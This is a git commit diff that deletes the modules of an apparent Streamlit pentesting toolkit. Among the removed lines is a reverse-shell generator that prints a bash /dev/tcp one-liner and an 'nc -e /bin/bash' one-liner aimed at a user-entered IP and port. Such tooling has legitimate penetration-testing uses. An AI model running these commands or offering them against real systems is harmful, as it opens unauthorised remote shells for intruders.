5668ce8052bc89c84c15d5f42a4294e93420f2f8
Clément G. <103967887+Sir22io@users.noreply.github.com>
2025-05-21 09:35:07 +0200

    Delete modules directory

--- modules/__init__.py
+++
@@ -1,7 +0,0 @@
-from modules.base import *
-from modules.exploit import *
-from modules.osint import *
-from modules.recon import *
-from modules.scanning import *
-from modules.reporting import *
-from modules.reverse_shell import *
--- modules/reverse_shell.py
+++
@@ -1,9 +0,0 @@
-import streamlit as st
-from modules.base import BaseModule,ModuleRegistry
-class ReverseShellModule(BaseModule):
-    def __init__(self): super().__init__("Reverse Shell","reverse_shell"); ModuleRegistry.register(self)
-    def render(self):
-        st.header("Reverse Shell"); ip=st.text_input("IP","127.0.0.1"); p=st.text_input("Port","9001")
-        for n,t in {"Bash":f"bash -i >& /dev/tcp/{ip}/{p} 0>&1","NC":f"nc {ip} {p} -e /bin/bash"}.items():
-            st.code(t)
-ReverseShellModule()
